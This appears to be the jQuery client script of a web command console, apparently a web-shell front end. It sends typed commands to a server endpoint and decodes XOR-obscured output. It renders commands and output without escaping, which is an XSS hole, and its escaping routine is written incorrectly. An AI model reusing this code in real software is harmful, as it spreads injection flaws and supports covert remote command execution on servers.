$(function() {
	var command, 
		response,
		currentDirectory = "",
		content = $('#console'),
		console = $('.console_log'),
		input 	= $('input');
	

	$(window).load(function(){
		/* setup custom scrollbar */ 
		$('#content_1').mCustomScrollbar({
					scrollButtons:{
						enable:false
					}
				});
		$('#content_1').mCustomScrollbar("scrollTo","bottom",{scrollEasing:"easeInOutQuad"});
	});

	// reserve ctrl+l
	shortcut.add("Ctrl+l",function() {
		console.html('');
		input.val('');
		$("#content_1").mCustomScrollbar('update');
	});

	/**
	* Clean string from html
	* @param string
	* @return decrypted string
	*/
	$.setDirectory = function (dir) {
		currentDirectory = dir;
		return true;
	}

	/**
	* Clean string from html
	* @return string
	*/
	$.getCurrentDirectory = function () {
		return currentDirectory;	
	}

	/**
	* Clean string from html
	* @param string
	* @return string
	*/
	$.clean = function(value) {
		if(typeof value !== 'string') {
		   throw new Error('htmlSpecialChars() works with strings.');
		    return;
		}
		var converted =  value.replace(/<+/g, '&lt;').
								replace(/>+/g, '&gt;').
		 						replace(/"+/g, '&quot;').
		 						replace(/&+/g, '&amp;'); 
	    return converted;
	};

	/**
	* Show error tooltip
	* @param text
	*/
	$.errorTooltip = function( text ) {
		var tooltip = $('#error_tooltip');
		tooltip.find('#message').text( text );
		tooltip.animate({'bottom': '35px'});
		setTimeout(function() { 
			tooltip.animate(
				{'bottom': '0px'},
				400, 
				function() {
					tooltip.find('#message').text( '' );
				}) },2000,"JavaScript");
	}

	/**
	* Response Decrypter
	* @param res
	* @return string
	*/
	$.decode = function (res) {
		var out;
		for (i = 0; i < res.length; ++i) out += String.fromCharCode(6 ^ res.charCodeAt(i));
		if( out ) out = out.replace('undefined','');
		return out;
	}

	/**
	* Response Encrypter
	* @param res
	* @return string
	*/
	$.encode = function (res) {
		var out;
		for (i = 0; i < res.length; i++) out += String.fromCharCode(6 ^ res.charCodeAt(i));
		if( out ) out = out.replace('undefined','');
		return out;
	}

	/**
	* Show response
	* @param cmd
	* @param res
	* @param element
	*/
	$.showResponse = function (cmd, res, element)
	{
		element.append('<div class="console_response"><span>['+$.getCurrentDirectory()+']$> </span><span>'+cmd+'</span></div>');
		element.append('<div><span>' + res + '</span></div>');

		// update custom scrollbar and scroll to bottom of the div
		$("#content_1").mCustomScrollbar('update');
		$('#content_1').mCustomScrollbar("scrollTo","bottom",{scrollInertia:400,scrollEasing:"easeInOutQuad"});

	}

	/**
	* Command Execute
	* @param string
	* @returns string 
	*/
	$.executeCommand = function ( cmd ) {
		var response;
	    $.ajaxSetup({async: false, dataType: 'json'});
	    // alert($.getCurrentDirectory());
		$.post("send/command", { 
			command: cmd,
			dir: $.getCurrentDirectory()
		}).complete(function(e) {
			response = e.output;
			$.setDirectory(e.directory);
		}).done(function (b) {
			response = b.output;
			$.setDirectory($.decode(b.directory));
			// alert($.decode(b.directory));
		}).error(function() { 
			response ='unknown command'; 
		});

		return $.decode(response);
	}


	input.focus().keydown(function(e) {

		// react on enter
		if( e.keyCode == 13 ) {

			// set command 
			command = $(this).val();

			// special reserved commands
			switch ( command )
			{
				case 'clear':
					console.html('');
					input.val('');
					return false;	
				break;

				case 'exit':
					console.append('<div class="console_response"></div>');
					console.append('<div><span>Bye my master</span></div>');
					input.val('');
					return false;
				break;

				case 'reload':
				case 'refresh':
					input.val('');
					location.reload();
					return false;
				break;
			}

			// checking of empty command
			if( command.length < 1 ) {
				$.errorTooltip('Empty commands are not allowed'); 
				return false;
			} 

			// set respose
			response = $.executeCommand(command);

			// unknown command
			if( command.length > 0 && !response ) {
				$.showResponse($.clean(command), 'Unknown command', console);
				input.val('');
				return false;
			}

			// append command and respose
			$.showResponse(command, response, console);

			// reset command input
			input.val('');
		}
	});

});